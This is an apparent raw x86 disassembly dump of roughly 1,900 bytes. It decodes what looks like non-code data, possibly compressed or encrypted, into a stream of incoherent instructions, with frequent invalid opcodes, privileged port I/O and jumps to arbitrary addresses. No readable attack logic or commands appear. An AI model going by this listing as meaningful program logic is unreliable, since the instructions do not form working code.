  41d237:	iret   
  41d238:	push   esp
  41d239:	pop    ebp
  41d23a:	ficomp DWORD PTR [edi-0x30395f9f]
  41d240:	push   cs
  41d241:	ins    BYTE PTR es:[edi],dx
  41d242:	push   cs
  41d243:	or     al,0xdd
  41d245:	rol    BYTE PTR [ebp-0x2d],1
  41d248:	data16 aas 
  41d24a:	mov    al,BYTE PTR [ecx-0x1ead310b]
  41d250:	hlt    
  41d251:	test   al,0xf7
  41d253:	aas    
  41d254:	xchg   ecx,eax
  41d255:	xor    ebx,DWORD PTR [ecx-0x27]
  41d258:	icebp  
  41d259:	mov    bl,0xe7
  41d25b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d25c:	mov    eax,0xd9c2218f
  41d261:	mov    eax,0xcb9472de
  41d266:	mov    eax,ds:0xe6f4efb8
  41d26b:	out    0xec,eax
  41d26d:	mov    WORD PTR [eax-0x70],fs
  41d270:	into   
  41d271:	sar    DWORD PTR [ecx+0x7c],1
  41d274:	inc    ebx
  41d275:	loopne 0x41d23f
  41d277:	inc    esp
  41d278:	inc    esp
  41d279:	xchg   ebp,eax
  41d27a:	dec    edx
  41d27b:	std    
  41d27c:	stos   DWORD PTR es:[edi],eax
  41d27d:	shrd   DWORD PTR [edi+0x66],esi,cl
  41d281:	and    DWORD PTR [edi-0x85abc57],esi
  41d287:	(bad)  
  41d288:	popa   
  41d289:	pop    esi
  41d28a:	je     0x41d243
  41d28c:	inc    esi
  41d28d:	pop    edi
  41d28e:	rcr    BYTE PTR [ecx+esi*1],0x7a
  41d292:	shl    DWORD PTR [ecx],cl
  41d294:	dec    ecx
  41d295:	in     al,0x66
  41d297:	push   0xffffff85
  41d299:	mov    ah,0xab
  41d29b:	add    bh,BYTE PTR [ecx-0x1a0bb40f]
  41d2a1:	(bad)  
  41d2a2:	dec    edi
  41d2a4:	loop   0x41d311
  41d2a6:	gs aaa 
  41d2a8:	stc    
  41d2a9:	push   ebx
  41d2aa:	sub    eax,0x448d672a
  41d2af:	xor    ax,0x5c6c
  41d2b3:	imul   eax,DWORD PTR [ebx-0x1e],0x502e9a
  41d2ba:	jo     0x41d32a
  41d2bc:	and    dl,ch
  41d2be:	and    DWORD PTR [edx+ebp*1-0x18b21d06],edx
  41d2c5:	pusha  
  41d2c6:	jae    0x41d287
  41d2c8:	xchg   ebx,eax
  41d2c9:	dec    ebx
  41d2ca:	fcom   DWORD PTR [ebx-0x3d3bab0d]
  41d2d0:	scas   eax,DWORD PTR es:[edi]
  41d2d1:	and    ebp,DWORD PTR [esp+ebx*4+0x381e9a75]
  41d2d8:	rol    ah,1
  41d2da:	fneni(8087 only) 
  41d2dc:	push   ds
  41d2dd:	sub    al,0x2
  41d2df:	shr    DWORD PTR [eax],0xc8
  41d2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2e3:	es cmp dh,dh
  41d2e6:	dec    eax
  41d2e7:	jbe    0x41d2e3
  41d2e9:	xchg   edi,eax
  41d2ea:	add    BYTE PTR [ebx+0x6d2c88de],0xc1
  41d2f1:	js     0x41d2b3
  41d2f3:	jge    0x41d372
  41d2f5:	clc    
  41d2f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2f7:	inc    DWORD PTR [esi-0x60850e7f]
  41d2fd:	jecxz  0x41d2fe
  41d2ff:	mov    es,WORD PTR [ebx]
  41d301:	(bad)  
  41d302:	call   0x233ded09
  41d307:	jno    0x41d2f5
  41d309:	enter  0xe35e,0xd2
  41d30d:	int3   
  41d30e:	cmp    cl,BYTE PTR [ebx-0x64]
  41d311:	(bad)  
  41d312:	fimul  WORD PTR [edx+esi*8-0x523cdbcf]
  41d319:	test   DWORD PTR [ebp+0x4772002e],ecx
  41d31f:	rcr    DWORD PTR ds:0x81529d8c,cl
  41d325:	in     al,dx
  41d326:	sub    DWORD PTR [esi-0x33],esi
  41d329:	call   0xa568:0x438d312e
  41d330:	outs   dx,BYTE PTR ds:[esi]
  41d331:	dec    ecx
  41d332:	test   eax,0xc9717cd3
  41d337:	bound  ebp,QWORD PTR [edx+0x9]
  41d33a:	cmc    
  41d33b:	or     edi,ebp
  41d33d:	lea    ebx,[esi+esi*8-0x10]
  41d341:	adc    al,0x3a
  41d343:	ficom  DWORD PTR [esp+edi*8]
  41d346:	mov    ch,0x9
  41d348:	push   edi
  41d349:	mov    WORD PTR [esi-0x2],fs
  41d34c:	cmp    edi,eax
  41d34e:	es cmp eax,0xe6fd2e16
  41d354:	cmp    edi,ebp
  41d356:	adc    ah,bl
  41d358:	pop    edx
  41d359:	addr16 pop ebp
  41d35b:	bound  ebx,QWORD PTR [eax+0x45]
  41d35e:	mov    ebx,0x7e708360
  41d363:	or     eax,0x90dded19
  41d368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d369:	dec    ebx
  41d36a:	push   ss
  41d36b:	std    
  41d36c:	icebp  
  41d36d:	enter  0x4b44,0x81
  41d371:	jb     0x41d3cd
  41d373:	xchg   ebx,eax
  41d374:	retf   
  41d375:	enter  0x97d0,0xb2
  41d379:	addr16 xor eax,0x7dcb549b
  41d37f:	adc    DWORD PTR [edx-0x3c8c08ae],eax
  41d385:	fimul  WORD PTR [ebx]
  41d387:	call   0xf1e2070e
  41d38c:	inc    BYTE PTR [edx+0x67]
  41d38f:	mul    BYTE PTR [esi]
  41d391:	fs inc esp
  41d393:	fisttp DWORD PTR [eax+0x7d0daa0a]
  41d399:	add    eax,0x649be56d
  41d39e:	stc    
  41d39f:	js     0x41d3a7
  41d3a1:	or     bh,BYTE PTR [esi]
  41d3a3:	add    ch,ah
  41d3a5:	xlat   BYTE PTR ds:[ebx]
  41d3a6:	mov    esp,0x6201783e
  41d3ab:	and    BYTE PTR [edi+eax*1-0x7316358e],dh
  41d3b2:	rcl    BYTE PTR [ebp+0x6f],0x35
  41d3b6:	adc    eax,0xfd1be123
  41d3bb:	mov    esi,0xebe3c488
  41d3c0:	and    BYTE PTR [esi+0x1d],0xa7
	...
  41d3d0:	add    BYTE PTR [edx-0x300eb0aa],bl
  41d3d6:	stc    
  41d3d7:	mov    esi,0xe316497f
  41d3dc:	stos   BYTE PTR es:[edi],al
  41d3dd:	dec    ebx
  41d3de:	lods   al,BYTE PTR ds:[esi]
  41d3df:	cdq    
  41d3e0:	out    0xbf,eax
  41d3e2:	dec    edi
  41d3e3:	add    DWORD PTR [eax],eax
  41d3e5:	stos   DWORD PTR es:[edi],eax
  41d3e6:	add    eax,DWORD PTR [eax]
  41d3e8:	add    bl,cl
  41d3ea:	popf   
  41d3eb:	iret   
  41d3ec:	inc    esi
  41d3ed:	dec    ecx
  41d3ee:	(bad)  
  41d3ef:	mov    edx,0xf7304bea
  41d3f4:	test   al,cl
  41d3f6:	xor    BYTE PTR [ebp+0x4d64094b],cl
  41d3fc:	lds    ecx,FWORD PTR [edx+0x65915cc7]
  41d402:	sub    al,0x9
  41d404:	pushf  
  41d405:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41d407:	mov    ds:0x4ddc87f,eax
  41d40c:	lods   eax,DWORD PTR ds:[esi]
  41d40d:	mov    al,ds:0x2066edc4
  41d412:	stos   BYTE PTR es:[edi],al
  41d413:	stos   BYTE PTR es:[edi],al
  41d414:	daa    
  41d415:	adc    eax,0x240686b2
  41d41a:	lods   al,BYTE PTR ds:[esi]
  41d41b:	sub    eax,0x2ac6318a
  41d420:	jmp    0x7fb7:0xf159e514
  41d427:	scas   eax,DWORD PTR es:[edi]
  41d428:	fist   DWORD PTR [esi-0x61]
  41d42b:	cmc    
  41d42c:	sahf   
  41d42d:	sbb    DWORD PTR [edi+edi*8-0x53ae18b1],0xffffffa8
  41d435:	std    
  41d436:	pop    ebp
  41d437:	inc    edx
  41d438:	loope  0x41d476
  41d43a:	addr16 sub eax,0x7e10430d
  41d440:	mov    ebp,0xfddfdcb2
  41d445:	call   0x9a82a940
  41d44a:	imul   ebp,esp,0xffffff9e
  41d44d:	fisttp DWORD PTR [edx+0x1c]
  41d450:	inc    edx
  41d451:	inc    edx
  41d452:	ror    DWORD PTR [edx+ecx*4+0x6c],1
  41d456:	ror    DWORD PTR [eax],1
  41d458:	dec    eax
  41d459:	mov    al,0xda
  41d45b:	or     BYTE PTR [ecx+0x2e],0x3c
  41d45f:	xchg   DWORD PTR ds:0x617e89c3,edx
  41d465:	and    DWORD PTR [esi-0xc889ddc],esp
  41d46b:	mov    ds:0xcfe10028,al
  41d470:	xor    BYTE PTR [ecx-0x61],dh
  41d473:	sahf   
  41d474:	test   al,0x94
  41d476:	sbb    edi,esi
  41d478:	in     eax,0x37
  41d47a:	or     eax,0x1f58bdff
  41d47f:	sub    edx,DWORD PTR [ebx-0x2b]
  41d482:	inc    edi
  41d483:	aam    0x3c
  41d485:	or     ebx,DWORD PTR [esi+0x34]
  41d488:	je     0x41d508
  41d48a:	jl     0x41d483
  41d48c:	mov    DWORD PTR [eax],esp
  41d48e:	mov    ah,0xe1
  41d490:	iret   
  41d491:	cmp    BYTE PTR [edi+esi*2-0x7f],bl
  41d495:	test   DWORD PTR [ecx+0xf7e00f4],edi
  41d49b:	xchg   ecx,eax
  41d49c:	stc    
  41d49d:	sub    ebp,DWORD PTR [edi+ebx*4+0x33]
  41d4a1:	jbe    0x41d509
  41d4a3:	stc    
  41d4a4:	mov    bh,0x3e
  41d4a6:	in     eax,dx
  41d4a7:	cli    
  41d4a8:	jge    0x41d45e
  41d4aa:	jmp    0xca3165a2
  41d4af:	jg     0x41d483
  41d4b1:	mov    edx,0xc804c436
  41d4b6:	jmp    0x41d530
  41d4b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4b9:	jl     0x41d481
  41d4bb:	neg    ecx
  41d4bd:	ins    DWORD PTR es:[edi],dx
  41d4be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4bf:	mov    eax,0xbcbe9875
  41d4c4:	fst    DWORD PTR [esi+esi*1+0x46]
  41d4c8:	repnz mov edi,0x537074b
  41d4ce:	mov    ebp,0x6d6047a8
  41d4d3:	push   esp
  41d4d4:	(bad)  
  41d4d5:	aas    
  41d4d6:	shl    DWORD PTR [ebp*1+0x771133b0],1
  41d4dd:	dec    edx
  41d4de:	jb     0x41d50c
  41d4e0:	jl     0x41d55a
  41d4e2:	imul   esi,DWORD PTR [ebx-0x3c],0xfe431e64
  41d4e9:	mov    ds:0x6ed953b2,eax
  41d4ee:	pop    edi
  41d4ef:	cmp    ah,0x12
  41d4f2:	pop    es
  41d4f3:	push   ebx
  41d4f4:	xor    al,0xf4
  41d4f6:	push   ebp
  41d4f7:	or     eax,0x6109cc67
  41d4fc:	xchg   BYTE PTR [eax-0x70],dh
  41d4ff:	in     eax,0x19
  41d501:	mov    esp,es
  41d503:	mov    edx,DWORD PTR [ebx+0x5b]
  41d506:	ins    BYTE PTR es:[edi],dx
  41d507:	out    0xa7,al
  41d509:	dec    ebp
  41d50a:	sub    BYTE PTR [edx-0x20],dh
  41d50d:	mov    ah,BYTE PTR [esi+0x78c8f6a9]
  41d513:	mov    ds:0xbc4708a6,al
  41d518:	mov    cl,0x1e
  41d51a:	and    al,0x53
  41d51c:	enter  0x64f1,0x67
  41d520:	add    al,ah
  41d522:	test   esp,ebx
  41d524:	sub    eax,0xfe5a547e
  41d529:	cmp    BYTE PTR ds:0xe5e96353,al
  41d52f:	inc    esp
  41d530:	dec    esi
  41d531:	cmp    al,0xf1
  41d533:	push   esi
  41d534:	dec    eax
  41d535:	push   ebp
  41d536:	ins    DWORD PTR es:[edi],dx
  41d537:	ds pop ss
  41d539:	and    al,BYTE PTR [edi+ebx*8]
  41d53c:	neg    BYTE PTR [ecx+0x2d530afb]
  41d542:	mov    al,ds:0x9332e97d
  41d547:	pop    ds
  41d548:	mov    ebx,0xd0043a55
  41d54d:	pop    edi
  41d54e:	into   
  41d54f:	cmp    edi,esi
  41d551:	mov    ah,0x54
  41d553:	mov    eax,0x8a87fe46
  41d558:	jmp    0x3d7094
  41d55d:	inc    ebp
  41d55e:	sbb    al,0xdd
  41d560:	or     ah,BYTE PTR [edi+0x36f940bd]
  41d566:	test   eax,0x9b9f2945
  41d56b:	inc    ebp
  41d56c:	mov    es,WORD PTR [edi]
  41d56e:	fsub   DWORD PTR [ebx+0x616a7bc1]
  41d574:	adc    BYTE PTR [edx+0x38],cl
  41d577:	push   ecx
  41d578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d579:	fcmovb st,st(1)
  41d57b:	jp     0x41d5c2
  41d57d:	ins    DWORD PTR es:[edi],dx
  41d57e:	je     0x41d556
  41d580:	popa   
  41d581:	mov    dh,0xa4
  41d583:	inc    al
  41d585:	mov    ecx,0x4d39340a
  41d58a:	pop    ecx
  41d58b:	pop    esi
  41d58c:	ret    
  41d58d:	pop    esp
  41d58e:	dec    ecx
  41d58f:	stos   BYTE PTR es:[edi],al
  41d590:	sub    edi,edi
  41d592:	mov    cl,0x65
  41d594:	sbb    al,0x5
  41d596:	or     ecx,DWORD PTR [ecx-0x6384b50]
  41d59c:	sbb    BYTE PTR [edx+0x6a],al
  41d59f:	fisubr WORD PTR [edi+0x4d264a15]
  41d5a5:	outs   dx,BYTE PTR ds:[esi]
  41d5a6:	or     dh,BYTE PTR [esi]
  41d5a8:	or     edi,DWORD PTR [ebp-0x5c]
  41d5ab:	fs dec ebp
  41d5ad:	fisubr DWORD PTR [ebp-0x1194098e]
  41d5b3:	cmp    dh,bh
  41d5b5:	sub    ebp,DWORD PTR [eax+0x5d28b712]
  41d5bb:	rdmsr  
  41d5bd:	mov    cl,0x2a
  41d5bf:	mov    ds:0xec402ca3,al
  41d5c4:	adc    al,0x3a
  41d5c6:	mov    ds:0x742ecee6,eax
  41d5cb:	rol    BYTE PTR [edx+0x493e5aca],0x43
  41d5d2:	adc    al,BYTE PTR [esi+0x67908cc0]
  41d5d8:	ins    BYTE PTR es:[edi],dx
  41d5d9:	cmp    al,0xf3
  41d5db:	xor    eax,esi
  41d5dd:	xor    DWORD PTR [edx-0x73],ecx
  41d5e0:	outs   dx,DWORD PTR ds:[esi]
  41d5e1:	cmc    
  41d5e2:	imul   ecx,DWORD PTR [ecx],0x494a4e06
  41d5e8:	popf   
  41d5e9:	add    DWORD PTR [esi-0x35],edi
  41d5ec:	arpl   si,ax
  41d5ee:	push   esi
  41d5ef:	aaa    
  41d5f0:	cmp    eax,0x86cc3e2d
  41d5f5:	std    
  41d5f6:	pop    esp
  41d5f7:	clc    
  41d5f8:	cmp    eax,ebx
  41d5fa:	jecxz  0x41d657
  41d5fc:	jo     0x41d63b
  41d5fe:	push   0x1f
  41d600:	cmp    al,0x10
  41d602:	mov    ebx,0x300d851b
  41d607:	cs jae 0x41d5b0
  41d60a:	in     al,dx
  41d60b:	lods   eax,DWORD PTR ds:[esi]
  41d60c:	and    dl,BYTE PTR [esi]
  41d60e:	mov    dl,0xb3
  41d610:	fcmovu st,st(1)
  41d612:	popa   
  41d613:	push   es
  41d614:	sbb    dl,ch
  41d616:	xchg   ebp,eax
  41d617:	cli    
  41d618:	cmp    eax,0x348d27b9
  41d61d:	mov    dl,0x69
  41d61f:	push   cs
  41d620:	adc    edi,esi
  41d622:	imul   ebp,DWORD PTR [eax],0xd88aace2
  41d628:	sbb    eax,0xf7a672ed
  41d62d:	fmul   QWORD PTR [esi]
  41d62f:	daa    
  41d630:	pop    esp
  41d631:	aad    0x30
  41d633:	push   0x23
  41d635:	jp     0x41d677
  41d637:	fcomp  st(5)
  41d639:	pushf  
  41d63a:	lods   al,BYTE PTR ds:[esi]
  41d63b:	add    esp,ebp
  41d63d:	cs mov esp,0x439118e5
  41d643:	jmp    0x3edf8e5d
  41d648:	lahf   
  41d649:	mov    ah,0x24
  41d64b:	imul   BYTE PTR [edx]
  41d64d:	repnz mov BYTE PTR [edi+0x16],dh
  41d651:	fimul  DWORD PTR [ebp+0x4a]
  41d654:	dec    esp
  41d655:	sub    al,0xb9
  41d657:	std    
  41d658:	dec    ebx
  41d659:	sbb    DWORD PTR [edx+0x5c],ecx
  41d65c:	dec    esi
  41d65d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d65e:	(bad)  [ebx]
  41d660:	call   0xbd08e7f1
  41d665:	(bad)  [edx+0x52]
  41d668:	lods   eax,DWORD PTR ds:[esi]
  41d669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d66a:	mov    eax,ds:0xeffad9f
  41d66f:	scas   eax,DWORD PTR es:[edi]
  41d670:	xlat   BYTE PTR ds:[ebx]
  41d671:	mov    ecx,0x3d1e4116
  41d676:	call   0xda7a3314
  41d67b:	in     al,0xb4
  41d67d:	pop    ebp
  41d67e:	push   edx
  41d67f:	in     eax,dx
  41d680:	push   ebp
  41d681:	and    DWORD PTR [esi-0x42],edi
  41d684:	clc    
  41d685:	adc    al,0x76
  41d687:	push   0x342b515f
  41d68c:	push   es
  41d68d:	sbb    esp,DWORD PTR ds:0xb88f56fa
  41d693:	out    dx,eax
  41d694:	rol    BYTE PTR [ebx+edx*1-0x1410d7e4],0x1a
  41d69c:	repz sbb BYTE PTR [ecx+0x71],bh
  41d6a0:	stos   DWORD PTR es:[edi],eax
  41d6a1:	mov    eax,ds:0x9a61df43
  41d6a6:	call   0xc1a74338
  41d6ab:	xor    eax,0xd530591e
  41d6b0:	and    eax,0x7c0fa235
  41d6b5:	int    0x8b
  41d6b7:	or     bl,BYTE PTR [ecx-0x6]
  41d6ba:	out    dx,eax
  41d6bb:	ror    bl,cl
  41d6bd:	xor    eax,0xaa6d820e
  41d6c2:	mov    edi,ecx
  41d6c4:	mov    dl,0xbc
  41d6c6:	dec    ecx
  41d6c7:	add    dl,BYTE PTR [esi+0x6a]
  41d6ca:	(bad)  
  41d6cb:	mov    dl,0x7b
  41d6cd:	xor    BYTE PTR [ecx],bh
  41d6cf:	shl    BYTE PTR [edx-0x43],1
  41d6d2:	mov    al,ds:0xfbf3715b
  41d6d7:	fmul   QWORD PTR [eax]
  41d6d9:	call   0xd5d5:0xcd3a227c
  41d6e0:	pop    esp
  41d6e1:	sub    eax,0xbbc3e60
  41d6e7:	jo     0x41d753
  41d6e9:	jle    0x41d6c0
  41d6eb:	push   eax
  41d6ec:	pop    eax
  41d6ed:	cmp    eax,0xfeb7bd8f
  41d6f2:	ret    0xca77
  41d6f5:	mov    bl,0xbd
  41d6f7:	(bad)  
  41d6f8:	and    ebx,DWORD PTR ds:0x1bfec602
  41d6fe:	xchg   edi,eax
  41d6ff:	lea    ebp,[edi]
  41d701:	mov    ah,ch
  41d703:	ins    DWORD PTR es:[edi],dx
  41d704:	arpl   di,dx
  41d706:	mov    edx,0x196884c
  41d70b:	pop    ds
  41d70c:	jns    0x41d6b7
  41d70e:	add    DWORD PTR [ecx+edx*2+0x30ef8045],edx
  41d715:	lahf   
  41d716:	or     BYTE PTR [edx+ebp*1+0x361c4115],ch
  41d71d:	in     al,0x35
  41d71f:	inc    esi
  41d720:	js     0x41d710
  41d722:	sbb    edx,ecx
  41d724:	push   eax
  41d725:	push   edi
  41d726:	xchg   esi,eax
  41d727:	lea    esi,[esi]
  41d729:	inc    eax
  41d72a:	fsub   QWORD PTR [edx-0x35]
  41d72d:	and    BYTE PTR [ebx-0x59769d00],cl
  41d733:	stos   BYTE PTR es:[edi],al
  41d734:	test   DWORD PTR [edi+ebp*8],ecx
  41d737:	out    0x5d,eax
  41d739:	clc    
  41d73a:	rcr    DWORD PTR [ebp-0x64],cl
  41d73d:	inc    esp
  41d73e:	mov    ecx,0x1344ca5
  41d743:	fcom   QWORD PTR [eax-0x26]
  41d746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d747:	sbb    DWORD PTR [edi+0x64],ebx
  41d74a:	jecxz  0x41d72b
  41d74c:	jbe    0x41d749
  41d74e:	les    eax,FWORD PTR [edi-0x15]
  41d751:	das    
  41d752:	xchg   ecx,eax
  41d753:	and    DWORD PTR [edi+0x68],edi
  41d756:	and    BYTE PTR [edi+0x320fe49d],dl
  41d75c:	sub    edx,DWORD PTR [esi-0x6b]
  41d75f:	sahf   
  41d760:	jg     0x41d719
  41d762:	test   al,0x7b
  41d764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d765:	sub    eax,0xad949185
  41d76a:	arpl   WORD PTR [eax-0x5c8f2db1],cx
  41d770:	jle    0x41d791
  41d772:	push   0xffffff8f
  41d774:	or     eax,0xc91f6302
  41d779:	repz jmp 0x22fa:0x9153a585
  41d781:	jno    0x41d7b6
  41d783:	(bad)  
  41d784:	dec    esp
  41d785:	imul   ecx,edi,0x1f
  41d788:	xchg   DWORD PTR [ebp+edx*8-0x63],ebx
  41d78c:	adc    ebp,DWORD PTR [ecx-0x2a1cb95b]
  41d792:	call   0x41d81e
	...
  41d79f:	add    BYTE PTR [eax],al
  41d7a1:	cld    
  41d7a2:	xlat   BYTE PTR ds:[ebx]
  41d7a3:	dec    esp
  41d7a4:	call   0xd83ed318
  41d7a9:	adc    BYTE PTR [ecx-0x612dec5e],ah
  41d7af:	addr16 jge 0x41d81c
  41d7b2:	push   ebx
  41d7b3:	add    DWORD PTR [eax],eax
  41d7b5:	stos   DWORD PTR es:[edi],eax
  41d7b6:	add    eax,DWORD PTR [eax]
  41d7b8:	add    BYTE PTR [ebx],cl
  41d7ba:	xchg   edi,eax
  41d7bb:	and    eax,DWORD PTR ds:0x164ebbcd
  41d7c1:	xor    bl,BYTE PTR [ebx]
  41d7c3:	push   ecx
  41d7c4:	bound  eax,QWORD PTR [eax+ecx*4-0x106be76e]
  41d7cb:	je     0x41d757
  41d7cd:	jbe    0x41d796
  41d7cf:	pop    esp
  41d7d0:	adc    DWORD PTR ds:0xffbb750a,esi
  41d7d6:	dec    edx
  41d7d7:	inc    esi
  41d7d8:	push   ebp
  41d7d9:	adc    ch,BYTE PTR [edi-0x4e]
  41d7dc:	pusha  
  41d7dd:	dec    esp
  41d7de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7df:	dec    edi
  41d7e0:	hlt    
  41d7e1:	scas   eax,DWORD PTR es:[edi]
  41d7e2:	mov    esi,0xd4b6dcb9
  41d7e7:	and    DWORD PTR [eax+0x8],ecx
  41d7ea:	or     edi,ebp
  41d7ec:	retf   0xc632
  41d7ef:	cmp    ch,ah
  41d7f1:	push   esp
  41d7f2:	and    eax,0xad5771c8
  41d7f7:	shr    ebx,1
  41d7f9:	les    esp,FWORD PTR [edx-0x32]
  41d7fc:	xchg   esi,eax
  41d7fd:	int    0x84
  41d7ff:	in     al,dx
  41d800:	das    
  41d801:	test   BYTE PTR [ebx+0x3e2cf77e],dh
  41d807:	aam    0x84
  41d809:	(bad)  
  41d80a:	mov    ebp,ds
  41d80c:	sub    ecx,esp
  41d80e:	mov    ds:0x8af8abbd,al
  41d813:	inc    esp
  41d814:	stc    
  41d815:	mov    edx,ss
  41d817:	and    al,bh
  41d819:	sbb    al,BYTE PTR [eax-0x46]
  41d81c:	inc    esp
  41d81d:	aas    
  41d81e:	pop    ebp
  41d81f:	pop    ebp
  41d820:	mov    dh,0x34
  41d822:	pusha  
  41d823:	pop    es
  41d824:	sbb    ebx,DWORD PTR [edi]
  41d826:	mov    dl,0xd2
  41d828:	(bad)  
  41d829:	or     bl,bh
  41d82b:	or     ebx,edi
  41d82d:	rol    edi,cl
  41d82f:	inc    esp
  41d830:	cmp    ch,al
  41d832:	es xchg ebx,esp
  41d835:	jo     0x41d843
  41d837:	test   dl,ah
  41d839:	les    esi,FWORD PTR [esi-0x45479829]
  41d83f:	inc    ecx
  41d840:	rcl    BYTE PTR [ebx+0x6f],0xe4
  41d844:	enter  0x505b,0x22
  41d848:	sub    al,0x14
  41d84a:	les    ebx,FWORD PTR [edi]
  41d84c:	push   es
  41d84d:	jo     0x41d83e
  41d84f:	cmp    dh,al
  41d851:	dec    ebp
  41d852:	mov    edx,0xaf2d031b
  41d857:	mov    bh,0x4f
  41d859:	inc    esp
  41d85a:	mov    al,ds:0xeceda3cc
  41d85f:	bound  eax,QWORD PTR [eax]
  41d861:	mov    BYTE PTR [edx-0x497c14c6],bl
  41d867:	in     al,0x94
  41d869:	lahf   
  41d86a:	fisttp DWORD PTR [ebx+0x3f]
  41d86d:	cmp    al,0xbb
  41d86f:	les    esp,FWORD PTR [ebx-0x69]
  41d872:	stos   BYTE PTR es:[edi],al
  41d873:	popa   
  41d874:	cmc    
  41d875:	out    0x85,eax
  41d877:	sbb    dl,BYTE PTR [edi-0x73a5fdaa]
  41d87d:	mov    cs,WORD PTR [ebx]
  41d87f:	jno    0x41d819
  41d881:	dec    edi
  41d882:	(bad)  ds:0x7ffd44e2
  41d888:	cmp    eax,0xffc0c91
  41d88d:	rol    DWORD PTR [esi+0x3cb05f75],0xdf
  41d894:	ins    DWORD PTR es:[edi],dx
  41d895:	sub    DWORD PTR [eax-0x4f],0xcfc67874
  41d89c:	aam    0x79
  41d89e:	inc    esi
  41d89f:	inc    eax
  41d8a0:	popf   
  41d8a1:	mov    DWORD PTR [ebx],ebx
  41d8a3:	push   esi
  41d8a4:	iret   
  41d8a5:	jmp    0x41d867
  41d8a7:	dec    ebx
  41d8a8:	stc    
  41d8a9:	pop    esi
  41d8aa:	jl     0x41d88f
  41d8ac:	mov    ?,WORD PTR [edx+0x1a1896b8]
  41d8b2:	jp     0x41d86f
  41d8b4:	sbb    dl,BYTE PTR [eax-0x59]
  41d8b7:	sub    DWORD PTR [edx],edx
  41d8b9:	loopne 0x41d891
  41d8bb:	jns    0x41d8f9
  41d8bd:	dec    edi
  41d8be:	(bad)
  41d8c2:	mov    cl,0x6a
  41d8c4:	jb     0x41d886
  41d8c6:	lock loopne 0x41d8ea
  41d8c9:	inc    ebx
  41d8ca:	repnz fild QWORD PTR [ecx+0x49]
  41d8ce:	retf   
  41d8cf:	push   cs
  41d8d0:	enter  0x7c8c,0xef
  41d8d4:	lahf   
  41d8d5:	add    al,0xe9
  41d8d7:	jp     0x41d906
  41d8d9:	scas   al,BYTE PTR es:[edi]
  41d8da:	div    dl
  41d8dc:	(bad)  
  41d8dd:	adc    bl,BYTE PTR [eax+0x2b]
  41d8e0:	loopne 0x41d8ea
  41d8e2:	fild   QWORD PTR [esi-0x80]
  41d8e5:	cld    
  41d8e6:	xor    al,0x17
  41d8e8:	jg     0x41d88c
  41d8ea:	sub    BYTE PTR [edx],al
  41d8ec:	icebp  
  41d8ed:	mov    edi,0x5707043d
  41d8f2:	sub    eax,0x4f19796
  41d8f7:	outs   dx,BYTE PTR ds:[esi]
  41d8f8:	es or  dh,ah
  41d8fb:	xchg   DWORD PTR [edx-0x13],ebp
  41d8fe:	adc    BYTE PTR [eax+edi*8+0x63],bl
  41d902:	mov    ds:0xb9a3424c,eax
  41d907:	sbb    ah,BYTE PTR [edi]
  41d909:	xchg   esp,eax
  41d90a:	jo     0x41d900
  41d90c:	sbb    bh,BYTE PTR [edi+0x2b]
  41d90f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d910:	sti    
  41d911:	stos   DWORD PTR es:[edi],eax
  41d912:	inc    esp
  41d913:	mov    bl,0xef
  41d915:	sub    cl,dl
  41d917:	mov    ds:0x14093fca,al
  41d91c:	push   eax
  41d91d:	jbe    0x41d932
  41d91f:	test   eax,0xbf7a98d2
  41d924:	pushf  
  41d925:	call   0xde26507b
  41d92a:	push   ebp
  41d92b:	addr16 pop edx
  41d92d:	lds    ebx,FWORD PTR [edx-0xd]
  41d930:	mov    eax,ds:0x9a95d557
  41d935:	shl    DWORD PTR [ebx],0x58
  41d938:	sbb    al,0xb5
  41d93a:	mov    ebp,DWORD PTR [ebx+0x5]
  41d93d:	mov    ebx,0xd920e6c6
  41d942:	cmp    eax,0x10b043e7
  41d947:	cmp    bh,BYTE PTR [eax]
  41d949:	rol    BYTE PTR [eax],cl
  41d94b:	rol    DWORD PTR [ecx+0x14],0x8f
  41d94f:	inc    esp
  41d950:	adc    cl,dl
  41d952:	push   0x800a137a
  41d957:	jno    0x41d972
  41d959:	mov    ds,WORD PTR [esi+0x148f4b4]
  41d95f:	leave  
  41d960:	nop
  41d961:	call   0xfa1c:0x38803795
  41d968:	mov    edi,0x23a963c
  41d96d:	push   eax
  41d96e:	stc    
  41d96f:	jno    0x41d9ac
  41d971:	ins    BYTE PTR es:[edi],dx
  41d972:	aas    
  41d973:	cmp    eax,0xf97cb94d
  41d978:	adc    al,al
  41d97a:	mov    bl,0x51
  41d97c:	fiadd  WORD PTR [ebx]
  41d97e:	js     0x41d9d1
  41d980:	jle    0x41d9d3
  41d982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d983:	imul   ecx,DWORD PTR [edi-0x23a859b5],0x47
  41d98a:	jnp    0x41d91a
  41d98c:	push   es
  41d98d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d98f:	pop    ss
  41d990:	(bad)  
  41d991:	fmul   DWORD PTR [edi+0x2b]
  41d994:	adc    al,0x1
  41d996:	pop    esp
  41d997:	mov    ah,0xe
  41d999:	jmp    0x41d9af
  41d99b:	repz sub BYTE PTR [edi-0x2b],dl
  41d99f:	aad    0xce
  41d9a1:	pop    ebx
  41d9a2:	loope  0x41d96d
  41d9a4:	inc    eax
  41d9a5:	or     al,0x8f
  41d9a7:	push   ecx
  41d9a8:	or     esi,ebp
  41d9aa:	or     bl,bh
  41d9ac:	leave  
  41d9ad:	fst    QWORD PTR [eax]
  41d9af:	fwait
  41d9b0:	cmp    esp,DWORD PTR [eax+0x6f96d41]
  41d9b6:	sahf   
